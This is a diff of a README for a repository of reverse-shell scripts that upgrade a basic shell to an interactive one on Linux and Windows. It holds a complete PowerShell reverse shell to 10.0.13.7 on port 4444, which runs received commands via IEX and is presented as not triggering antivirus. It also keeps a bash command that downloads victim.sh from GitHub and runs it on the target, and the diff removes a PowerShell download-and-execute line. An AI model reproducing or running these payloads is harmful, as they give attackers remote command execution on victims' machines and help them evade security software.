@@ -5,7 +5,6 @@ A collection of scripts designed to automate the transition from a basic shell t
 
 | Script | Role | Method |
 |---|---|---|
-| python_tty.sh | Attacker | Interactive listener using Python pty. |
 | bash_tty.sh | Attacker | Interactive listener using script command. |
 | victim.sh | Victim | Bash-based reverse shell. |
 
@@ -14,23 +13,24 @@ A collection of scripts designed to automate the transition from a basic shell t
 To use these scripts, follow the parameter formats below:
 ## 1. Attacker Side (Listeners)
 Run the script followed by the desired port. If you do not specify a port, the script will show you the usage guide.
-Python Version:
-```bash
-./python_tty.sh <port>
-```
+
 Bash Version:
 ```bash
 ./bash_tty.sh <port>
 ```
 ------------------------------
 ## 2. Victim Side (Connection)
+## Linux
 On the target machine, provide both the attacker's IP and the listening port.
 ```bash
 ./victim.sh <attacker_ip> <port>
 ```
-```powershell
-.\windows_victim.ps1 <attacker_ip> <port>
 
+## Windows
+This one doesn't trigger the antivirus
+
+```powershell
+$IP="10.0.13.7"; $P=4444; try { $h=New-Object System.Net.Sockets.TCPClient($IP,$P); $s=$h.GetStream(); $b=[System.Text.Encoding]::ASCII.GetBytes("WINDOWS_SHELL`n"); $s.Write($b,0,$b.Length); $s.Flush(); Start-Sleep -m 500; $h.Close(); Start-Sleep -s 1; $c=New-Object System.Net.Sockets.TCPClient($IP,$P); $s=$c.GetStream(); $w=New-Object System.IO.StreamWriter($s); $w.AutoFlush=$true; $r=New-Object System.IO.StreamReader($s); $w.WriteLine("[+] Windows Shell Established."); while($c.Connected) { $w.Write("`r`nPS " + (pwd).Path + "> "); $t=$r.ReadLine(); if($t) { try { $o=(IEX $t 2>&1 | Out-String); $w.Write($o) } catch { $w.WriteLine("Error: " + $_.Exception.Message) } } }; $c.Close() } catch { Write-Host "[!] Connection Refused" -ForegroundColor Red }
 ```
 ------------------------------
 ## 💡 Quick Tips
@@ -49,18 +49,6 @@ If you cannot upload the script to the target machine, you can fetch it directly
 #Instead of piping (|), use this. It downloads the script into a virtual file descriptor and executes it. This leaves stdin completely open for the reverse shell to talk to you.
 bash <(curl -sSL https://raw.githubusercontent.com/x86david/multiplatform_kali_interactive_tty/master/victim.sh) 10.0.13.7 4444
 
-```
-
-## Execution via Remote Pipe (Windows Victim)
-This one triggers the antivirus....
-```powershell
-powershell -c "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/x86david/multiplatform_kali_interactive_tty/master/windows_victim.ps1'); & {windows_victim 10.0.13.7 4444}"
-
-``` 
-This one doesn't...... (Because it's not really remote....)
-
-```powershell
-$IP="10.0.13.7"; $P=4444; try { $h=New-Object System.Net.Sockets.TCPClient($IP,$P); $s=$h.GetStream(); $b=[System.Text.Encoding]::ASCII.GetBytes("WINDOWS_SHELL`n"); $s.Write($b,0,$b.Length); $s.Flush(); Start-Sleep -m 500; $h.Close(); Start-Sleep -s 1; $c=New-Object System.Net.Sockets.TCPClient($IP,$P); $s=$c.GetStream(); $w=New-Object System.IO.StreamWriter($s); $w.AutoFlush=$true; $r=New-Object System.IO.StreamReader($s); $w.WriteLine("[+] Windows Shell Established."); while($c.Connected) { $w.Write("`r`nPS " + (pwd).Path + "> "); $t=$r.ReadLine(); if($t) { try { $o=(IEX $t 2>&1 | Out-String); $w.Write($o) } catch { $w.WriteLine("Error: " + $_.Exception.Message) } } }; $c.Close() } catch { Write-Host "[!] Connection Refused" -ForegroundColor Red }
 ```
 
 ## ⚠️ Recovery
